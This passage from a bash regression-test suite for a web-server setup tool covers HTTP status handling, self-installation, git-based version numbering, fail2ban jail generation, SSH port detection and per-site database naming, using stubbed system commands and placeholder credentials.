assert_true "proxy static dir created" test -d "${SITES_ROOT}/paths-proxy.example.com/public_html/static"
assert_true "proxy app dir created" test -d "${SITES_ROOT}/paths-proxy.example.com/app"
assert_true "wordpress cache dir created" test -d "${OLS_CACHE_DIR}/paths-wordpress.example.com"
assert_true "acme webroot created" test -d "${ACME_ROOT}/.well-known/acme-challenge"
lib_domain_state_reset

# =============================================================================
section "HTTP status helper (regression: 000000)"
# curl prints 000 itself on a connection failure and then exits non-zero, so appending a
# fallback produced "000000"; callers compared that against "000" and saw a healthy server.
curl() {
  case "${FAKE_CURL:-ok}" in
    ok)   printf '200' ;;
    fail) printf '000'; return 7 ;;
    empty) return 7 ;;
  esac
}
FAKE_CURL=ok;    assert_eq "successful request" "200" "$(lib_http_code http://127.0.0.1/)"
FAKE_CURL=fail;  assert_eq "connection refused is exactly 000" "000" "$(lib_http_code http://127.0.0.1/)"
FAKE_CURL=empty; assert_eq "no output at all is 000" "000" "$(lib_http_code http://127.0.0.1/)"
FAKE_CURL=fail;  assert_true "failure is detected as 000" bash -c "[[ '$(lib_http_code http://127.0.0.1/)' == '000' ]]"
unset -f curl; unset FAKE_CURL

# =============================================================================
section "self-installation (regression: the command runs the installed copy)"
# "lompstack" runs the copy under INSTALL_DIR, not the checkout, so a git pull alone does
# not change what runs. lib_install_self refreshes it, and must never replace a working
# installation with a checkout that does not parse.
SRC_GOOD="$TMP/src-good"
mkdir -p "$SRC_GOOD/lib"
printf '#!/usr/bin/env bash\necho marker-v1\n' >"$SRC_GOOD/setup.sh"
printf '# lib a\n' >"$SRC_GOOD/lib/a.sh"
printf '# lib b\n' >"$SRC_GOOD/lib/b.sh"
assert_eq "install_self exits 0" 0 "$(run_isolated lib_install_self "$SRC_GOOD")"
assert_true "setup.sh copied" test -f "${INSTALL_DIR}/setup.sh"
if (( CAN_SYMLINK )); then
  assert_true "long command linked" test -L "$BIN_LINK"
  assert_true "short alias linked" test -L "$BIN_SHORT"
  assert_eq "both names point at the same script" "$(readlink -f "$BIN_LINK")" "$(readlink -f "$BIN_SHORT")"
  # an unrelated program owning the short name must not be replaced
  rm -f "$BIN_SHORT"; printf '#!/bin/sh\necho other\n' >"$BIN_SHORT"
  lib_install_self "$SRC_GOOD" >/dev/null 2>&1
  assert_false "a real file at the short name is left alone" test -L "$BIN_SHORT"
  assert_has "the foreign program survived" "echo other" "$(cat "$BIN_SHORT")"
  rm -f "$BIN_SHORT"
fi
assert_true "lib copied" test -f "${INSTALL_DIR}/lib/a.sh"
assert_has "copied content is the source" "marker-v1" "$(cat "${INSTALL_DIR}/setup.sh")"
# compared by suffix: MSYS rewrites absolute paths when handing them to jq
assert_has "source dir recorded for self-update" "src-good" "$(lib_manifest_get '.install.source_dir')"

# a file removed from the checkout must disappear from the installation
rm -f "$SRC_GOOD/lib/b.sh"
printf '#!/usr/bin/env bash\necho marker-v2\n' >"$SRC_GOOD/setup.sh"
lib_install_self "$SRC_GOOD" >/dev/null 2>&1
assert_has "second copy updated" "marker-v2" "$(cat "${INSTALL_DIR}/setup.sh")"
assert_false "deleted module is gone from the installation" test -f "${INSTALL_DIR}/lib/b.sh"
assert_false "no staging leftovers" test -e "${INSTALL_DIR}/lib.new"
assert_false "no rollback leftovers" test -e "${INSTALL_DIR}/lib.old"

SRC_BAD="$TMP/src-bad"
mkdir -p "$SRC_BAD/lib"
printf '#!/usr/bin/env bash\necho ok\n' >"$SRC_BAD/setup.sh"
printf 'if then fi\n' >"$SRC_BAD/lib/broken.sh"
assert_eq "a checkout that does not parse is refused" 1 "$(run_isolated lib_install_self "$SRC_BAD")"
assert_has "the good installation survived" "marker-v2" "$(cat "${INSTALL_DIR}/setup.sh")"
assert_false "the broken module was not installed" test -f "${INSTALL_DIR}/lib/broken.sh"

# =============================================================================
section "version number (counted by git, carried by the installed copy)"
# setup.sh declares only the release line; the last number counts the commits since the first
# one, so every change that reaches main raises it and nobody edits a number. The copy under
# INSTALL_DIR is no checkout, so lib_install_self writes the version into its VERSION file.
if lib_have git; then
  # the fixture's commits must not depend on this machine's git configuration (signing, hooks)
  mkdir -p "$TMP/vgit-home"
  vgit() {
    HOME="$TMP/vgit-home" XDG_CONFIG_HOME="$TMP/vgit-home" GIT_CONFIG_NOSYSTEM=1 \
      git -c user.name=unit -c user.email=unit@example.invalid -c init.defaultBranch=main "$@"
  }
  VREPO="$TMP/vrepo"
  mkdir -p "$VREPO/lib"
  printf '#!/usr/bin/env bash\nreadonly SCRIPT_VERSION_LINE="2.5"\necho vrepo\n' >"$VREPO/setup.sh"
  printf '# lib a\n' >"$VREPO/lib/a.sh"
  vgit init -q "$VREPO"
  vgit -C "$VREPO" add -A
  vgit -C "$VREPO" commit -q -m first
  vgit -C "$VREPO" commit -q --allow-empty -m second
  vgit -C "$VREPO" commit -q --allow-empty -m third
  assert_eq "a checkout counts the commits after the first" "2.5.2" "$(lib_version_detect "$VREPO")"
  assert_eq "an older revision counts fewer" "1" "$(lib_version_count "$VREPO" HEAD~1)"
  assert_eq "no revision, no count" "" "$(lib_version_count "$VREPO" "")"
  vgit -C "$VREPO" commit -q --allow-empty -m fourth
  assert_eq "each commit raises it by one" "2.5.3" "$(lib_version_detect "$VREPO")"

  # a shallow clone has lost the commits it would count: say so rather than print a wrong number
  cp -a "$VREPO" "$TMP/vshallow"
  vgit -C "$TMP/vshallow" rev-parse HEAD~1 >"$TMP/vshallow/.git/shallow"
  assert_eq "a shallow clone gives no count" "2.5.x" "$(lib_version_detect "$TMP/vshallow")"
  assert_eq "nor does a plain directory" "${SCRIPT_VERSION_LINE}.x" "$(lib_version_detect "$SRC_GOOD")"

  lib_install_self "$VREPO" >/dev/null 2>&1
  assert_eq "the installed copy carries its version" "2.5.3" "$(cat "${INSTALL_DIR}/VERSION")"
  assert_eq "and reports it" "2.5.3" "$(lib_version_detect "$INSTALL_DIR")"
  assert_false "no staged VERSION left behind" test -e "${INSTALL_DIR}/VERSION.new"

  # a copy that an older release installed has no VERSION: it is counted in the checkout it came
  # from, at the revision recorded then - not at wherever that checkout's HEAD is now
  rm -f "${INSTALL_DIR}/VERSION"
  vgit -C "$VREPO" commit -q --allow-empty -m fifth
  assert_eq "a copy without VERSION counts at its recorded revision" "2.5.3" "$(lib_version_detect "$INSTALL_DIR")"
  printf 'garbage\n' >"${INSTALL_DIR}/VERSION"
  assert_eq "a VERSION that is no version is not believed" "2.5.x" "$(lib_version_detect "$INSTALL_DIR")"

  # setup.sh works its version out when it starts, before anything prints it
  VCOPY="$TMP/vcopy"
  mkdir -p "$VCOPY"; cp -a "$ROOT/setup.sh" "$ROOT/lib" "$VCOPY/"
  printf '7.7.7\n' >"$VCOPY/VERSION"
  assert_eq "setup.sh --version prints its copy's version" "setup.sh 7.7.7" "$(bash "$VCOPY/setup.sh" --version 2>&1 | head -n 1)"

  # self-update shows the checkout's step from one version to the next, and ends with the version
  # it installed, not the one of the release that is running
  vgit clone -q "$VREPO" "$TMP/vclone"
  vgit -C "$VREPO" commit -q --allow-empty -m sixth
  V_OLD="$(git -C "$TMP/vclone" rev-parse --short HEAD)"; V_NEW="$(git -C "$VREPO" rev-parse --short HEAD)"
  V_OUT="$(OPT_QUIET=0; eval 'lib_require_tools() { :; }; lib_require_installed() { :; }; lib_selfupdate_migrate() { echo MIGRATE-RUN; }'
           lib_selfupdate_main --from "$TMP/vclone" 2>&1)"
  assert_has "self-update names both versions" "Checkout updated: 2.5.4 (${V_OLD}) -> 2.5.5 (${V_NEW})" "$V_OUT"
  assert_has "and the one it installed" "Now running lompstack 2.5.5 (${V_NEW})" "$V_OUT"
  assert_eq  "then applies what that release changes, last" "MIGRATE-RUN" "$(tail -n 1 <<<"$V_OUT")"
  V_OUT="$(OPT_QUIET=0; eval 'lib_require_tools() { :; }; lib_require_installed() { :; }; lib_selfupdate_migrate() { echo MIGRATE-RUN; }'
           lib_selfupdate_main --from "$TMP/vclone" 2>&1)"
  assert_has "a second run finds nothing new" "Already at the latest revision: 2.5.5 (${V_NEW})" "$V_OUT"
  assert_has "and still applies them: an older release's self-update could not" "MIGRATE-RUN" "$V_OUT"
  V_OUT="$(OPT_QUIET=0; OPT_DRY_RUN=1; eval 'lib_require_tools() { :; }; lib_require_installed() { :; }; lib_selfupdate_migrate() { echo MIGRATE-RUN; }'
           lib_selfupdate_main --from "$TMP/vclone" 2>&1)"
  assert_lacks "a dry run applies nothing" "MIGRATE-RUN" "$V_OUT"
  # the copy it installed does the work, in this process's place; one from before "migrate"
  # existed is left to update
  _mg_inst="$INSTALL_DIR"; INSTALL_DIR="$TMP/mg-inst"; mkdir -p "$INSTALL_DIR/lib"
  printf '#!/bin/bash\necho "ran: $*"\n' >"$INSTALL_DIR/setup.sh"; chmod +x "$INSTALL_DIR/setup.sh"
  : >"$INSTALL_DIR/lib/install.sh"
  V_OUT="$(OPT_QUIET=0; lib_selfupdate_migrate 2>&1; echo still-here)"
  assert_has   "an older copy is told to run update" "'sudo lomp update' applies" "$V_OUT"
  assert_lacks "and is not run"                      "ran:" "$V_OUT"
  printf 'lib_install_migrate() {\n' >"$INSTALL_DIR/lib/install.sh"
  V_OUT="$(OPT_QUIET=0; lib_selfupdate_migrate 2>&1; echo still-here)"
  assert_has   "the installed copy runs migrate" "ran: migrate" "$V_OUT"
  assert_lacks "in place of the release that installed it" "still-here" "$V_OUT"
  INSTALL_DIR="$_mg_inst"

  # a directory that is no checkout installs as "x", with no revision left over from before
  lib_install_self "$SRC_GOOD" >/dev/null 2>&1
  assert_eq "a copy of a plain directory has no count" "${SCRIPT_VERSION_LINE}.x" "$(lib_version_detect "$INSTALL_DIR")"
  assert_eq "and no revision" "" "$(lib_manifest_get '.install.revision')"
  unset -f vgit
else
  section "  (no git: version number tests skipped)"
fi

# =============================================================================
section "interactive menu"
# The menu must never hijack a non-interactive run: cron, pipes and --non-interactive
# have to keep getting the ordinary help output instead of a prompt nobody can answer.
menu_out="$(lib_menu_main 2>&1)"
assert_has "no terminal falls back to help" "USAGE" "$menu_out"
assert_has "help mentions the menu" "Interactive menu" "$menu_out"
assert_eq "menu exits 0 without a terminal" 0 "$(run_isolated lib_menu_main)"
OPT_NON_INTERACTIVE=1
assert_eq "menu exits 0 when non-interactive" 0 "$(run_isolated lib_menu_main)"
OPT_NON_INTERACTIVE=1   # the suite runs non-interactive throughout
assert_has "command name prefers the short alias" "lomp" "$(_menu_cmd_name)"

# Adding a site from the menu with Enter everywhere. A site usually goes in before its DNS
# moves here, so no certificate is asked for yet, and the contact is the site's own address.
_madd() {   # domain [question=answer...] -> the command the menu runs
  (
    eval '_menu_ask() { local -n _o="$1"; _o="${_ma[$1]-${3:-}}"; }
          _menu_run() { printf "%s\n" "$*"; }
          lib_mail_installed() { return 1; }'
    declare -A _ma=([domain]="$1"); shift
    for _kv in "$@"; do _ma[${_kv%%=*}]="${_kv#*=}"; done
    _menu_add_site 2>/dev/null | tail -n 1
  )
}
assert_eq "Enter everywhere: www, no certificate yet, info@ the site" \
  "add KumeSos.com --www --no-ssl --email info@kumesos.com" "$(_madd KumeSos.com)"
assert_eq "a certificate and another address when asked for" \
  "add kumesos.com --email ops@example.org" "$(_madd kumesos.com www=n ssl=y email=ops@example.org)"

# =============================================================================
section "smoke test expectations per site mode"
# A proxy site is created before its application is deployed, so 502/503 from an absent
# backend must count as success. Getting this wrong made "add --proxy" roll the whole
# site back for a completely normal situation.
lib_domain_state_reset
D_MODE="php";    assert_eq "php site"            "200|301|302"                 "$(lib_domain_expected_codes)"
D_MODE="static"; assert_eq "static site"         "200|301|302"                 "$(lib_domain_expected_codes)"
D_MODE="proxy";  assert_eq "proxy tolerates 50x" "200|301|302|502|503|504"     "$(lib_domain_expected_codes)"
D_MODE="php"; D_WWW=1; D_WWW_PRIMARY=1
assert_eq "apex redirects to www"                "301|302"                     "$(lib_domain_expected_codes)"
D_MODE="proxy"
assert_eq "proxy plus www-primary"               "301|302|502|503|504"         "$(lib_domain_expected_codes)"
D_MODE="php"; D_WWW=0; D_WWW_PRIMARY=0
assert_eq "lenient also accepts 403"             "200|301|302|403"             "$(lib_domain_expected_codes lenient)"
assert_eq "helper exits 0"                       0                             "$(run_isolated lib_domain_expected_codes)"
lib_domain_state_reset

# =============================================================================
section "shell pitfalls (static)"
# Under set -u a "local x" that is only assigned on some branches aborts the script when it
# is read on another branch. This bit lib_db_install ("dump: unbound variable") on a real
# server, so every scalar local must be initialised at declaration.
bare_locals="$(for f in "$ROOT/setup.sh" "$ROOT"/lib/*.sh "$ROOT"/tests/*.sh; do
  awk -v F="$f" '
    BEGIN { q = sprintf("%c", 39); hd = "" }            # a literal single quote
    # A here-document body is data, not code: Postfix master.cf has a service called "local",
    # and a renderer that prints it must not read as a bare "local" declaration.
    {
      if (hd != "") { if ($0 ~ "^[[:space:]]*" hd "[[:space:]]*$") hd = ""; next }
      probe = $0
      gsub(/<<</, "@@@", probe)                         # a here-string is not a here-document
      if (match(probe, /<<-?[[:space:]]*[A-Za-z_"]+/) || match(probe, "<<-?[[:space:]]*" q "[A-Za-z_]+" q)) {
        d = substr(probe, RSTART, RLENGTH)
        sub(/^<<-?[[:space:]]*/, "", d)
        gsub("[\"" q "]", "", d)
        if (d != "") { hd = d; next }
      }
    }
    /^[[:space:]]*local[[:space:]]+-/ { next }          # typed declarations are left alone
    /^[[:space:]]*local[[:space:]]/ {
      line=$0
      sub(/^[[:space:]]*local[[:space:]]+/, "", line)
      gsub(/"[^"]*"/, "", line)                         # values may contain spaces
      gsub(q "[^" q "]*" q, "", line)
      gsub(/\$\(\([^)]*\)\)/, "", line)                 # arithmetic values, e.g. $(( A - B ))
      gsub(/\$\([^)]*\)/, "", line)                     # command substitution
      gsub(/\$\{[^}]*\}/, "", line)
      sub(/;.*$/, "", line)                             # another command on the same line
      n=split(line, tok, /[[:space:]]+/)
      for (i=1; i<=n; i++) if (tok[i] ~ /^[A-Za-z_][A-Za-z0-9_]*$/) printf "%s:%d: %s\n", F, NR, tok[i]
    }
  ' "$f"
done)"
assert_eq "every scalar local is initialised" "" "$bare_locals"
# A group that ends in "[[ ... ]] && cmd" exits 1 when the test is false. Feeding such a
# group into a pipeline makes pipefail kill the whole script. This regression guard exists
# because exactly that bug reached a real server in lib_domain_fail2ban_regen.
# The word inside ${x:-word} is quote-processed even inside double quotes, so an apostrophe
# there opens a quoted region that runs to the next one - swallowing whole lines of code with
# no syntax error. This shipped in the mail DNS table: two records silently disappeared.
quoted_defaults="$(grep -nE '\$\{[A-Za-z_][A-Za-z0-9_]*:[-=][^}]*'"'" "$ROOT/setup.sh" "$ROOT"/lib/*.sh "$ROOT"/tests/*.sh || true)"
assert_eq "no apostrophe inside a \${x:-default}" "" "$quoted_defaults"
pitfalls="$(for f in "$ROOT/setup.sh" "$ROOT"/lib/*.sh "$ROOT"/tests/*.sh; do
  awk -v F="$f" '
    /^[[:space:]]*\}[[:space:]]*\|/ {
      if (prev ~ /(^|[^|&])&&[^&]/ || prev ~ /^[[:space:]]*(\[\[|\(\()/) printf "%s:%d: %s\n", F, prevnr, prev
    }
    !/^[[:space:]]*(#|$)/ { prev=$0; prevnr=NR }
  ' "$f"
done)"
assert_eq "no piped group ends in a conditional" "" "$pitfalls"
# A process substitution runs in its own subshell, and "set -E" hands that subshell the ERR
# trap. When a probe inside it fails, the trap prints a full "FAILED: command exited with
# status 255" report in the middle of a perfectly healthy run. Every such probe is optional
# by construction (the caller has a default), so a pipeline inside "< <(...)" must end in
# "|| true". This shipped: "sshd -T" exits 255 on stock Ubuntu 24.04.
procsub="$(grep -nE '< <\(.*\|' "$ROOT/setup.sh" "$ROOT"/lib/*.sh | grep -v '|| true)$' || true)"
assert_eq "a piped process substitution ends in || true" "" "$procsub"
# Sibling of the guard above, on the other side of the substitution. "var=$( (( x )) && cmd )"
# exits 1 whenever the test is false: the substitution's last command failed, and a plain
# assignment adopts its status, so errexit kills the run. Harmless in an ARGUMENT position
# (lib_ok "... $( (( x )) && printf ... )") because there the status is discarded - so only
# assignments are flagged, and only when the substitution carries no || fallback.
# This shipped in lib_domain_summary and killed "add" after the site was already live.
condsub="$(for f in "$ROOT/setup.sh" "$ROOT"/lib/*.sh "$ROOT"/tests/*.sh; do
  awk -v F="$f" '
    /^[[:space:]]*#/ { next }
    # The substitution must belong to the assignment VALUE: either right after "=", or
    # inside its opening double quote. Without that, "VAR=1 some-command $( (( x )) && ... )"
    # matches too - and that is an environment prefix, not an assignment, so the status
    # belongs to the command and is never adopted.
    match($0, /[A-Za-z_][A-Za-z0-9_]*[+]?=("[^"]*)?\$\([[:space:]]*(\(\(|\[\[)/) {
      rest = substr($0, RSTART)
      if (index(rest, "&&") > 0 && index(rest, "||") == 0) printf "%s:%d: %s\n", F, NR, $0
    }
  ' "$f"
done)"
assert_eq "no assignment takes its status from a conditional substitution" "" "$condsub"

# ...and the function that had it must survive every combination for real
lib_domain_state_reset
D_DOMAIN="sum.example.com"; D_MODE="php"; D_HOME="${SITES_ROOT}/sum.example.com"
D_USER="sum_example_com"; D_GROUP="sum_example_com"; D_PHP="8.3"
D_SSL=0; D_SSL_WANTED=0
assert_eq "summary exits 0 when SSL was never wanted"        0 "$(run_isolated lib_domain_summary)"
assert_has "and tells you how to get one once DNS points here" "renew-ssl sum.example.com" "$(lib_domain_summary 2>&1)"
D_SSL_WANTED=1
assert_eq "summary exits 0 when SSL is wanted but not active" 0 "$(run_isolated lib_domain_summary)"
assert_has "and it tells you how to get one" "renew-ssl" "$(lib_domain_summary 2>&1)"
D_SSL=1
assert_eq "summary exits 0 when SSL is active"                0 "$(run_isolated lib_domain_summary)"
D_WWW=1; D_WP=1; D_DB_NAME="sum_db"
assert_eq "summary exits 0 for a www WordPress site"         0 "$(run_isolated lib_domain_summary)"
lib_domain_state_reset

# ...and a dry run must reach it with the state the rest of the run built up.
# The database step reads domain.json back, because lib_db_create_for_domain writes .db into
# the file directly rather than through the D_* globals. A dry run writes no file, so that
# load failed - and lib_domain_state_load resets every D_* BEFORE it looks at the file. Each
# step reported the site correctly and the closing summary then announced "Site  is ready",
# mode php for a --static site, /public_html as the document root, and the certificate --no-ssl
# had just declined as one that failed ("not active (run: setup.sh renew-ssl ...)").
_orig_dapply="$(declare -f lib_domain_apply_config)"; _orig_reqi="$(declare -f lib_require_installed)"
_orig_smoke="$(declare -f lib_ols_smoke_test)"; _orig_dbi="$(declare -f lib_db_installed)"
# lib_ols_is_installed has no definition left here - an earlier section unset it - so this one
# is removed again below rather than restored.
eval 'lib_ols_is_installed()    { return 0; }'
eval 'lib_domain_apply_config() { return 0; }'
eval 'lib_ols_smoke_test()      { return 0; }'
eval 'lib_db_installed()        { return 0; }'
eval 'lib_require_installed()   { return 0; }'   # the test manifest carries no .installed_at
OPT_DRY_RUN=1
out="$(lib_domain_add_main dry.example.com --static --no-ssl 2>&1)"
OPT_DRY_RUN=0
assert_has   "a dry run names the site it just described" "Site dry.example.com is ready" "$out"
assert_has   "with its URL"           "http://dry.example.com/" "$out"
assert_has   "the mode that was asked for" "Mode                       static" "$out"
assert_has   "its document root"      "${SITES_ROOT}/dry.example.com/public_html" "$out"
assert_has   "its system user"        "dry_example_com (uploaded as root? setup.sh fix-owner dry.example.com)" "$out"
assert_has   "and its logs"           "${SITES_ROOT}/dry.example.com/logs/access.log" "$out"
assert_lacks "never the reset defaults" "Mode                       php" "$out"
assert_has   "the certificate --no-ssl declined as not requested" "not requested (once DNS points here: setup.sh renew-ssl dry.example.com)" "$out"
assert_lacks "never as one that failed" "not active (run: setup.sh renew-ssl" "$out"
assert_false "while the dry run itself registers nothing" lib_domain_registered dry.example.com
unset -f lib_ols_is_installed
eval "$_orig_dapply"; eval "$_orig_smoke"; eval "$_orig_dbi"; eval "$_orig_reqi"
lib_domain_state_reset

# =============================================================================
section "SSH port detection (regression: a failing probe printed a fatal error)"
sshd() { printf 'sshd: no matching key exchange method\n' >&2; return 255; }
ss()   { return 127; }   # minimal container: iproute2 not installed
saved_conn="${SSH_CONNECTION:-}"; unset SSH_CONNECTION
err="$(lib_ssh_ports 2>&1 >/dev/null)"
assert_eq "broken probes print nothing" "" "$err"
assert_eq "falls back to port 22" "22" "$(lib_ssh_ports 2>/dev/null)"
assert_eq "lib_ssh_ports still exits 0" 0 "$(run_isolated lib_ssh_ports)"
SSH_CONNECTION="203.0.113.5 50000 10.0.0.1 2222"
assert_eq "the active connection's port wins" "2222" "$(lib_ssh_ports 2>/dev/null)"
assert_eq "still exits 0 with a connection" 0 "$(run_isolated lib_ssh_ports)"
sshd() { printf 'port 22\nport 2200\npermitrootlogin no\n'; }
assert_eq "ports from sshd -T are merged and sorted" "22 2200 2222" "$(lib_ssh_ports 2>/dev/null)"
unset -f sshd ss
if [[ -n "$saved_conn" ]]; then SSH_CONNECTION="$saved_conn"; else unset SSH_CONNECTION; fi

# =============================================================================
section "lib_join (regression: multi-character separators)"
assert_eq "single item"        "a"           "$(lib_join ', ' a)"
assert_eq "no items"           ""            "$(lib_join ', ')"
assert_eq "one-char separator" "a,b,c"       "$(lib_join ',' a b c)"
# "local IFS=', '" joins on the comma alone and drops the space - the bug this guards
assert_eq "two-char separator" "a, b, c"     "$(lib_join ', ' a b c)"
assert_eq "empty first item"   ", b"         "$(lib_join ', ' '' b)"
assert_eq "separator with a newline and indent" $'x\n          y' "$(lib_join $'\n          ' x y)"

# =============================================================================
section "fail2ban jail regeneration (regression: empty Cloudflare action)"
mkdir -p "$FAIL2BAN_FILTER_DIR"
mv "$STATE_DIR/domains" "$STATE_DIR/domains.bak" 2>/dev/null || true
mkdir -p "$STATE_DIR/domains"
CF_F2B_ACTION="$TMP/cf-action.conf"; CF_F2B_AUTH="$TMP/cf-auth.header"; CF_INI="$TMP/cloudflare-absent.ini"
lib_pkg_installed() { [[ "$1" == "fail2ban" ]]; }
lib_service_active() { return 1; }
# run with errexit explicitly re-armed: this is what the installer does, and what broke
rc=0; ( set -Eeuo pipefail; shopt -s lastpipe; lib_domain_fail2ban_regen ) >/dev/null 2>&1 || rc=$?
assert_eq "regen succeeds with no sites and no Cloudflare token" 0 "$rc"
assert_true "web jail file written" test -s "$FAIL2BAN_WEB_JAIL_FILE"
out="$(cat "$FAIL2BAN_WEB_JAIL_FILE")"
assert_has "wp-login jail present" "[server-setup-wp-login]" "$out"
assert_has "probe jail present" "[server-setup-web-probe]" "$out"
assert_has "jails disabled while there are no sites" "enabled = false" "$out"
assert_lacks "no cloudflare action without a token" "server-setup-cloudflare" "$out"
assert_true "wp-login filter written" test -s "${FAIL2BAN_FILTER_DIR}/server-setup-wp-login.conf"
assert_true "probe filter written" test -s "${FAIL2BAN_FILTER_DIR}/server-setup-web-probe.conf"
if (( CAN_CHMOD )); then assert_eq "jail file is 0600" "600" "$(stat -c %a "$FAIL2BAN_WEB_JAIL_FILE")"; fi
rc=0; ( set -Eeuo pipefail; shopt -s lastpipe; lib_domain_fail2ban_regen ) >/dev/null 2>&1 || rc=$?
assert_eq "second regen is also clean" 0 "$rc"

# The shape that actually runs in production - several sites plus a Cloudflare token -
# renders two constructs the empty case never reaches: the indented multi-line "logpath"
# continuation, and the two-line Cloudflare action block. Both are fail2ban syntax that
# silently disables a jail when it comes out wrong, so assert on them directly.
for d in alpha.example beta.example gamma.example delta.example; do
  mkdir -p "$STATE_DIR/domains/$d" "$SITES_LOG_ROOT/$d"
  printf '{"domain":"%s"}\n' "$d" >"$STATE_DIR/domains/$d/domain.json"
done
: >"$SITES_LOG_ROOT/alpha.example/access.log"; : >"$SITES_LOG_ROOT/beta.example/access.log"
# delta's vhost is an older release's: until update moves them, its logs are in its home
mkdir -p "$SITES_ROOT/delta.example/logs" "$LSWS_VHOSTS_DIR/delta.example"; : >"$SITES_ROOT/delta.example/logs/access.log"
printf 'accesslog $VH_ROOT/logs/access.log {\n}\n' >"$LSWS_VHOSTS_DIR/delta.example/vhconf.conf"
printf 'dns_cloudflare_api_token = Xv8sQ2pLm9TzR4kWn1bYc7dEf0g\n' >"$CF_INI"
: >"$CF_F2B_ACTION"
lib_manifest_set '.cloudflare.account_id' 'acc0123456789'
assert_eq "regen succeeds with sites and a Cloudflare token" 0 "$(run_isolated lib_domain_fail2ban_regen)"
out="$(cat "$FAIL2BAN_WEB_JAIL_FILE")"
assert_has "jails enabled once a site exists" "enabled = true" "$out"
assert_has "first site logpath" "logpath = ${SITES_LOG_ROOT}/alpha.example/access.log" "$out"
# fail2ban only reads the second path as part of logpath while the line stays indented
assert_has "second site is an indented continuation" $'\n          '"${SITES_LOG_ROOT}/beta.example/access.log" "$out"
# fail2ban refuses a jail none of whose files exist, and the reload with it
assert_lacks "a site whose access.log is not there yet is left out" "gamma.example" "$out"
assert_has   "a site whose logs update has not moved yet is read where they are" "${SITES_ROOT}/delta.example/logs/access.log" "$out"
assert_eq "cloudflare action reaches both jails" 2 "$(grep -c 'server-setup-cloudflare' <<<"$out")"
assert_eq "both jails still inherit action_" 2 "$(grep -c '^action = %(action_)s$' <<<"$out")"
assert_has "account passed to the action" 'cfaccount="acc0123456789"' "$out"
# the token used to be an action argument here, which put it on the command line of every ban
assert_lacks "the token itself never reaches the jail file" 'Xv8sQ2pLm9TzR4kWn1bYc7dEf0g' "$out"
# the action block belongs to the jail above it; one stray newline moves it into the next
assert_eq "action stays inside the wp-login jail" "logpath action action_cf [server-setup-web-probe]" \
  "$(awk '/^logpath/{print "logpath"} /^action = /{print "action"} /server-setup-cloudflare/{print "action_cf"} /^\[server-setup-web-probe\]/{print; exit}' <<<"$out" | tr '\n' ' ' | sed 's/ $//')"
assert_eq "second regen with sites is also clean" 0 "$(run_isolated lib_domain_fail2ban_regen)"
if (( CAN_CHMOD )); then assert_eq "the jail file stays 0600" "600" "$(stat -c %a "$FAIL2BAN_WEB_JAIL_FILE")"; fi
# regen is where a server that stored its token before this file existed gets it
assert_true "regen wrote the header file the action reads" test -s "$CF_F2B_AUTH"
rm -rf "$STATE_DIR/domains" "$LSWS_VHOSTS_DIR/delta.example" "$SITES_ROOT/delta.example"
mv "$STATE_DIR/domains.bak" "$STATE_DIR/domains" 2>/dev/null || mkdir -p "$STATE_DIR/domains"

# =============================================================================
section "sshd -t needs its privilege separation directory"
# "Missing privilege separation directory: /run/sshd" failed a real install at step 8 on a
# socket-activated Ubuntu 24.04 host. /run is a tmpfs and ssh.service - the unit carrying
# RuntimeDirectory=sshd - never ran, so the directory simply did not exist.
_psd="$TMP/run-sshd"
assert_false "absent to begin with" test -d "$_psd"
assert_eq "creating it succeeds" 0 "$(run_isolated lib_ssh_privsep_dir_ensure "$_psd")"
assert_true "and it exists" test -d "$_psd"
if (( CAN_CHMOD )); then assert_eq "mode is 0755" "755" "$(stat -c %a "$_psd")"; fi
assert_eq "a second call is a no-op that still succeeds" 0 "$(run_isolated lib_ssh_privsep_dir_ensure "$_psd")"
assert_true "and leaves it in place" test -d "$_psd"

# =============================================================================
section "per-site database naming and defaults"
assert_eq "db base is the first label"      "ilahitube_db"   "$(_db_name_base ilahitube.com db 60)"
assert_eq "user base is the first label"    "ilahitube_user" "$(_db_name_base ilahitube.com user 32)"
assert_eq "a subdomain uses its own label"  "shop_db"        "$(_db_name_base shop.example.com db 60)"
assert_eq "dashes become underscores"       "my_site_db"     "$(_db_name_base my-site.com db 60)"
assert_eq "a leading digit gets a prefix"   "s_123_db"       "$(_db_name_base 123.com db 60)"
# the label is truncated BEFORE the suffix, so the suffix survives MySQL's 32-char user cap
_long="$(_db_name_base averyveryverylongdomainnamethatkeepsgoing.com user 32)"
assert_true  "the user name fits in 32 chars" test "${#_long}" -le 32
assert_eq    "and still ends in _user" "_user" "${_long: -5}"
assert_eq    "db and user bases differ" "1" "$([[ "$(_db_name_base x.com db 60)" != "$(_db_name_base x.com user 32)" ]] && echo 1 || echo 0)"
# every new site gets a database unless it opts out
lib_domain_parse_add_args a.example.com --no-ssl
assert_eq "a database is created by default" "1" "$DOM_OPT_WITH_DB"
DOM_OPT_WITH_DB=1
lib_domain_parse_add_args b.example.com --no-ssl --no-db
assert_eq "--no-db opts out" "0" "$DOM_OPT_WITH_DB"
DOM_OPT_WITH_DB=1
lib_domain_parse_add_args c.example.com --no-ssl --wordpress
assert_eq "wordpress still forces one on" "1" "$DOM_OPT_WITH_DB"
DOM_OPT_WITH_DB=1
lib_domain_state_reset

# "db list" is new code: it has to survive a host with no MariaDB and a host with no sites,
# and it must never print a password - those stay behind "credentials".
_orig_dbinst="$(declare -f lib_db_installed)"; _orig_dbsql="$(declare -f lib_db_sql)"
lib_db_installed() { return 1; }
assert_eq "db list exits 0 without MariaDB" 0 "$(run_isolated lib_db_list)"
# lib_note and lib_ok are suppressed by OPT_QUIET (common.sh:78-83) and this harness runs
# quiet, so the content assertions below have to ask for what a human actually sees.
OPT_QUIET=0
assert_has "and says why" "not installed" "$(lib_db_list 2>&1)"
OPT_QUIET=1
assert_eq "under --quiet it stays silent" "" "$(lib_db_list 2>&1)"
lib_db_installed() { return 0; }
lib_db_sql() { printf '0\n'; }
assert_eq "db list exits 0 with MariaDB present" 0 "$(run_isolated lib_db_list)"
OPT_QUIET=0
assert_has   "it names the columns" "DATABASE" "$(lib_db_list 2>&1)"
assert_has   "and points at credentials for passwords" "credentials" "$(lib_db_list 2>&1)"
assert_lacks "it never prints a password field" "DB password" "$(lib_db_list 2>&1)"
OPT_QUIET=1

# "db passwd": MariaDB, db.info and the application's environment must end up with the SAME
# new password - one of them left behind is a site that cannot reach its database.
_orig_dbsec="$(declare -f lib_db_sql_secret)"; _orig_dbwait="$(declare -f lib_db_wait_ready)"
_pw_old="OldPassOldPassOldPass12345678901"
_pw_dir="$(lib_domain_state_dir pw.example.com)"; mkdir -p "$_pw_dir"
